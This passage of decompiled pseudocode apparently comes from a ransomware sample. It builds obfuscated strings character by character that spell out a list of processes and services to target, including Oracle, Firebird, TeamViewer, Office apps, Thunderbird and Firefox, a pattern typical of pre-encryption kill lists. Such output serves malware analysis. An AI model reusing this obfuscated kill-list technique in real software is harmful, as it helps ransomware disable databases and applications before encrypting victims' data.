fcn.00401120(100);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x62);\n    fcn.00401120(0x65);\n    fcn.00401120(0x20);\n    fcn.00401120(0x43);\n    fcn.00401120(0x45);\n    fcn.00401120(0x46);\n    fcn.00401120(0x20);\n    fcn.00401120(0x48);\n    fcn.00401120(0x65);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x70);\n    uVar17 = 0x65;\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x10);\n    puVar7 = fcn.00401010(0x10);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x6e);\n    fcn.00401120(0x6f);\n    uVar17 = 100;\n    fcn.00401120(100);\n    fcn.00401120(0x65);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 4);\n    puVar7 = fcn.00401010(4);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x41);\n    fcn.00401120(100);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x62);\n    fcn.00401120(0x65);\n    fcn.00401120(0x49);\n    fcn.00401120(0x50);\n    fcn.00401120(0x43);\n    fcn.00401120(0x42);\n    fcn.00401120(0x72);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x6b);\n    uVar17 = 0x65;\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0xe);\n    puVar7 = fcn.00401010(0xe);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x73);\n    fcn.00401120(0x79);\n    fcn.00401120(0x6e);\n    fcn.00401120(99);\n    fcn.00401120(0x2d);\n    fcn.00401120(0x74);\n    fcn.00401120(0x61);\n    fcn.00401120(0x73);\n    fcn.00401120(0x6b);\n    fcn.00401120(0x62);\n    uVar17 = 0x61;\n    fcn.00401120(0x61);\n    fcn.00401120(0x72);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0xc);\n    puVar7 = fcn.00401010(0xc);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x73);\n    fcn.00401120(0x79);\n    fcn.00401120(0x6e);\n    fcn.00401120(99);\n    fcn.00401120(0x2d);\n    fcn.00401120(0x77);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x72);\n    fcn.00401120(0x6b);\n    uVar17 = 0x65;\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0xb);\n    puVar7 = fcn.00401010(0xb);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x49);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x70);\n    fcn.00401120(0x75);\n    fcn.00401120(0x74);\n    fcn.00401120(0x50);\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    fcn.00401120(0x73);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x61);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x69);\n    fcn.00401120(0x7a);\n    fcn.00401120(0x61);\n    fcn.00401120(0x74);\n    fcn.00401120(0x69);\n    uVar17 = 0x6f;\n    fcn.00401120(0x6f);\n    fcn.00401120(0x6e);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x14);\n    puVar7 = fcn.00401010(0x14);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x41);\n    fcn.00401120(100);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x62);\n    fcn.00401120(0x65);\n    fcn.00401120(0x43);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x61);\n    fcn.00401120(0x62);\n    fcn.00401120(0x53);\n    fcn.00401120(0x79);\n    uVar17 = 0x6e;\n    fcn.00401120(0x6e);\n    fcn.00401120(99);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0xf);\n    puVar7 = fcn.00401010(0xf);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x42);\n    fcn.00401120(0x72);\n    fcn.00401120(0x43);\n    fcn.00401120(0x74);\n    fcn.00401120(0x72);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x43);\n    fcn.00401120(0x6e);\n    uVar17 = 0x74;\n    fcn.00401120(0x74);\n    fcn.00401120(0x72);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 10);\n    puVar7 = fcn.00401010(10);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x42);\n    fcn.00401120(0x72);\n    fcn.00401120(0x43);\n    fcn.00401120(99);\n    fcn.00401120(0x55);\n    fcn.00401120(0x78);\n    fcn.00401120(0x53);\n    uVar17 = 0x79;\n    fcn.00401120(0x79);\n    fcn.00401120(0x73);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 9);\n    puVar7 = fcn.00401010(9);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x53);\n    fcn.00401120(0x69);\n    fcn.00401120(0x6d);\n    fcn.00401120(0x70);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x79);\n    fcn.00401120(0x43);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x65);\n    fcn.00401120(99);\n    fcn.00401120(0x74);\n    fcn.00401120(0x69);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x4d);\n    fcn.00401120(0x61);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x61);\n    fcn.00401120(0x67);\n    uVar17 = 0x65;\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x17);\n    puVar7 = fcn.00401010(0x17);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x53);\n    fcn.00401120(0x69);\n    fcn.00401120(0x6d);\n    fcn.00401120(0x70);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x79);\n    fcn.00401120(0x2e);\n    fcn.00401120(0x53);\n    fcn.00401120(0x79);\n    fcn.00401120(0x73);\n    fcn.00401120(0x74);\n    fcn.00401120(0x65);\n    fcn.00401120(0x6d);\n    fcn.00401120(0x54);\n    fcn.00401120(0x72);\n    fcn.00401120(0x61);\n    fcn.00401120(0x79);\n    fcn.00401120(0x49);\n    fcn.00401120(99);\n    uVar17 = 0x6f;\n    fcn.00401120(0x6f);\n    fcn.00401120(0x6e);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x15);\n    puVar7 = fcn.00401010(0x15);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x66);\n    fcn.00401120(0x62);\n    fcn.00401120(0x67);\n    fcn.00401120(0x75);\n    fcn.00401120(0x61);\n    uVar17 = 0x72;\n    fcn.00401120(0x72);\n    fcn.00401120(100);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 7);\n    puVar7 = fcn.00401010(7);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x66);\n    fcn.00401120(0x62);\n    fcn.00401120(0x73);\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    fcn.00401120(0x76);\n    uVar17 = 0x65;\n    fcn.00401120(0x65);\n    uVar15 = CONCAT44(uVar17, 0x72);\n    fcn.00401120(0x72);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar16 = uVar15 & 0xffffffff00000000;\n        uVar1 = fcn.00401120(uVar15 >> 0x20);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n        uVar15 = uVar16;\n    } while (uVar12 < 8);\n    puVar7 = fcn.00401010(8);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x4f);\n    fcn.00401120(0x4e);\n    fcn.00401120(0x45);\n    fcn.00401120(0x4e);\n    fcn.00401120(0x4f);\n    fcn.00401120(0x54);\n    uVar17 = 0x45;\n    fcn.00401120(0x45);\n    uVar15 = CONCAT44(uVar17, 0x4d);\n    fcn.00401120(0x4d);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar16 = uVar15 & 0xffffffff00000000;\n        uVar1 = fcn.00401120(uVar15 >> 0x20);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n        uVar15 = uVar16;\n    } while (uVar12 < 8);\n    puVar7 = fcn.00401010(8);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x77);\n    fcn.00401120(0x73);\n    fcn.00401120(0x61);\n    fcn.00401120(0x5f);\n    fcn.00401120(0x73);\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    fcn.00401120(0x76);\n    fcn.00401120(0x69);\n    uVar17 = 99;\n    fcn.00401120(99);\n    fcn.00401120(0x65);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0xb);\n    puVar7 = fcn.00401010(0xb);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x6b);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x61);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x79);\n    fcn.00401120(0x2d);\n    fcn.00401120(0x65);\n    fcn.00401120(0x78);\n    fcn.00401120(0x70);\n    fcn.00401120(0x2d);\n    fcn.00401120(0x65);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x67);\n    fcn.00401120(0x69);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x65);\n    fcn.00401120(0x2d);\n    fcn.00401120(0x73);\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    fcn.00401120(0x76);\n    fcn.00401120(0x69);\n    uVar17 = 99;\n    fcn.00401120(99);\n    fcn.00401120(0x65);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x18);\n    puVar7 = fcn.00401010(0x18);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x54);\n    fcn.00401120(0x65);\n    fcn.00401120(0x61);\n    fcn.00401120(0x6d);\n    fcn.00401120(0x56);\n    fcn.00401120(0x69);\n    fcn.00401120(0x65);\n    fcn.00401120(0x77);\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    fcn.00401120(0x5f);\n    fcn.00401120(0x53);\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    fcn.00401120(0x76);\n    fcn.00401120(0x69);\n    uVar17 = 99;\n    fcn.00401120(99);\n    fcn.00401120(0x65);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x12);\n    puVar7 = fcn.00401010(0x12);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x54);\n    fcn.00401120(0x65);\n    fcn.00401120(0x61);\n    fcn.00401120(0x6d);\n    fcn.00401120(0x56);\n    fcn.00401120(0x69);\n    fcn.00401120(0x65);\n    fcn.00401120(0x77);\n    uVar17 = 0x65;\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 10);\n    puVar7 = fcn.00401010(10);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x74);\n    fcn.00401120(0x76);\n    fcn.00401120(0x5f);\n    fcn.00401120(0x77);\n    uVar17 = 0x33;\n    fcn.00401120(0x33);\n    fcn.00401120(0x32);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 6);\n    puVar7 = fcn.00401010(6);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x74);\n    fcn.00401120(0x76);\n    fcn.00401120(0x5f);\n    fcn.00401120(0x78);\n    uVar17 = 0x36;\n    fcn.00401120(0x36);\n    fcn.00401120(0x34);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 6);\n    puVar7 = fcn.00401010(6);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x54);\n    fcn.00401120(0x69);\n    fcn.00401120(0x74);\n    fcn.00401120(0x61);\n    uVar17 = 0x6e;\n    fcn.00401120(0x6e);\n    fcn.00401120(0x56);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 6);\n    puVar7 = fcn.00401010(6);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x53);\n    fcn.00401120(0x73);\n    uVar17 = 0x6d;\n    fcn.00401120(0x6d);\n    fcn.00401120(0x73);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 4);\n    puVar7 = fcn.00401010(4);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x6e);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x74);\n    fcn.00401120(0x65);\n    fcn.00401120(0x70);\n    uVar17 = 0x61;\n    fcn.00401120(0x61);\n    fcn.00401120(100);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 7);\n    puVar7 = fcn.00401010(7);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x52);\n    fcn.00401120(100);\n    fcn.00401120(0x72);\n    fcn.00401120(0x43);\n    uVar17 = 0x45;\n    fcn.00401120(0x45);\n    fcn.00401120(0x46);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 6);\n    puVar7 = fcn.00401010(6);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x73);\n    uVar17 = 0x61;\n    fcn.00401120(0x61);\n    fcn.00401120(0x6d);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 3);\n    puVar7 = fcn.00401010(3);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x6f);\n    fcn.00401120(0x72);\n    fcn.00401120(0x61);\n    fcn.00401120(99);\n    uVar17 = 0x6c;\n    fcn.00401120(0x6c);\n    fcn.00401120(0x65);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 6);\n    puVar7 = fcn.00401010(6);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x6f);\n    fcn.00401120(99);\n    fcn.00401120(0x73);\n    uVar17 = 0x73;\n    fcn.00401120(0x73);\n    fcn.00401120(100);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 5);\n    puVar7 = fcn.00401010(5);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(100);\n    fcn.00401120(0x62);\n    fcn.00401120(0x73);\n    fcn.00401120(0x6e);\n    uVar17 = 0x6d;\n    fcn.00401120(0x6d);\n    fcn.00401120(0x70);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 6);\n    puVar7 = fcn.00401010(6);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x73);\n    fcn.00401120(0x79);\n    fcn.00401120(0x6e);\n    fcn.00401120(99);\n    fcn.00401120(0x74);\n    fcn.00401120(0x69);\n    uVar17 = 0x6d;\n    fcn.00401120(0x6d);\n    fcn.00401120(0x65);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 8);\n    puVar7 = fcn.00401010(8);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x61);\n    fcn.00401120(0x67);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x74);\n    fcn.00401120(0x73);\n    uVar17 = 0x76;\n    fcn.00401120(0x76);\n    fcn.00401120(99);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 7);\n    puVar7 = fcn.00401010(7);\n    *puVar7 = 0;\n    in_stack_000001c8 = fcn.00401000();\n    fcn.00401120(0x69);\n    fcn.00401120(0x73);\n    fcn.00401120(0x71);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x70);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x75);\n    fcn.00401120(0x73);\n    fcn.00401120(0x73);\n    uVar17 = 0x76;\n    fcn.00401120(0x76);\n    fcn.00401120(99);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0xb);\n    puVar7 = fcn.00401010(0xb);\n    *puVar7 = 0;\n    in_stack_00000188 = fcn.00401000();\n    fcn.00401120(0x78);\n    fcn.00401120(0x66);\n    fcn.00401120(0x73);\n    fcn.00401120(0x73);\n    fcn.00401120(0x76);\n    fcn.00401120(99);\n    fcn.00401120(99);\n    uVar17 = 0x6f;\n    fcn.00401120(0x6f);\n    fcn.00401120(0x6e);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 9);\n    puVar7 = fcn.00401010(9);\n    *puVar7 = 0;\n    in_stack_00000150 = fcn.00401000();\n    fcn.00401120(0x6d);\n    fcn.00401120(0x79);\n    fcn.00401120(100);\n    fcn.00401120(0x65);\n    fcn.00401120(0x73);\n    fcn.00401120(0x6b);\n    fcn.00401120(0x74);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x70);\n    fcn.00401120(0x73);\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    fcn.00401120(0x76);\n    fcn.00401120(0x69);\n    uVar17 = 99;\n    fcn.00401120(99);\n    fcn.00401120(0x65);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x10);\n    puVar7 = fcn.00401010(0x10);\n    *puVar7 = 0;\n    in_stack_000000f8 = fcn.00401000();\n    fcn.00401120(0x6f);\n    fcn.00401120(99);\n    fcn.00401120(0x61);\n    fcn.00401120(0x75);\n    fcn.00401120(0x74);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x75);\n    fcn.00401120(0x70);\n    uVar17 = 100;\n    fcn.00401120(100);\n    fcn.00401120(0x73);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 10);\n    puVar7 = fcn.00401010(10);\n    *puVar7 = 0;\n    in_stack_000000bc = fcn.00401000();\n    fcn.00401120(0x65);\n    fcn.00401120(0x6e);\n    fcn.00401120(99);\n    fcn.00401120(0x73);\n    uVar17 = 0x76;\n    fcn.00401120(0x76);\n    fcn.00401120(99);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 6);\n    puVar7 = fcn.00401010(6);\n    *puVar7 = 0;\n    in_stack_00000090 = fcn.00401000();\n    fcn.00401120(0x66);\n    fcn.00401120(0x69);\n    fcn.00401120(0x72);\n    fcn.00401120(0x65);\n    fcn.00401120(0x66);\n    uVar17 = 0x6f;\n    fcn.00401120(0x6f);\n    fcn.00401120(0x78);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 7);\n    puVar7 = fcn.00401010(7);\n    *puVar7 = 0;\n    in_stack_00000060 = fcn.00401000();\n    fcn.00401120(0x74);\n    fcn.00401120(0x62);\n    fcn.00401120(0x69);\n    fcn.00401120(0x72);\n    fcn.00401120(100);\n    fcn.00401120(99);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x66);\n    uVar17 = 0x69;\n    fcn.00401120(0x69);\n    fcn.00401120(0x67);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0xb);\n    puVar7 = fcn.00401010(0xb);\n    *puVar7 = 0;\n    in_stack_00000020 = fcn.00401000();\n    fcn.00401120(0x6d);\n    fcn.00401120(0x79);\n    fcn.00401120(100);\n    fcn.00401120(0x65);\n    fcn.00401120(0x73);\n    fcn.00401120(0x6b);\n    fcn.00401120(0x74);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x70);\n    fcn.00401120(0x71);\n    uVar17 = 0x6f;\n    fcn.00401120(0x6f);\n    fcn.00401120(0x73);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0xc);\n    puVar7 = fcn.00401010(0xc);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x6f);\n    fcn.00401120(99);\n    fcn.00401120(0x6f);\n    uVar17 = 0x6d;\n    fcn.00401120(0x6d);\n    fcn.00401120(0x6d);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 5);\n    puVar7 = fcn.00401010(5);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(100);\n    fcn.00401120(0x62);\n    fcn.00401120(0x65);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x67);\n    uVar17 = 0x35;\n    fcn.00401120(0x35);\n    fcn.00401120(0x30);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 7);\n    puVar7 = fcn.00401010(7);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x73);\n    fcn.00401120(0x71);\n    fcn.00401120(0x62);\n    fcn.00401120(99);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x72);\n    fcn.00401120(0x65);\n    fcn.00401120(0x73);\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    fcn.00401120(0x76);\n    fcn.00401120(0x69);\n    uVar17 = 99;\n    fcn.00401120(99);\n    fcn.00401120(0x65);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0xe);\n    puVar7 = fcn.00401010(0xe);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x65);\n    fcn.00401120(0x78);\n    fcn.00401120(99);\n    uVar17 = 0x65;\n    fcn.00401120(0x65);\n    fcn.00401120(0x6c);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 5);\n    puVar7 = fcn.00401010(5);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x69);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x66);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x70);\n    fcn.00401120(0x61);\n    uVar17 = 0x74;\n    fcn.00401120(0x74);\n    fcn.00401120(0x68);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 8);\n    puVar7 = fcn.00401010(8);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x6d);\n    fcn.00401120(0x73);\n    fcn.00401120(0x61);\n    fcn.00401120(99);\n    fcn.00401120(99);\n    fcn.00401120(0x65);\n    uVar17 = 0x73;\n    fcn.00401120(0x73);\n    fcn.00401120(0x73);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 8);\n    puVar7 = fcn.00401010(8);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x6d);\n    fcn.00401120(0x73);\n    fcn.00401120(0x70);\n    uVar17 = 0x75;\n    fcn.00401120(0x75);\n    fcn.00401120(0x62);\n    uVar12 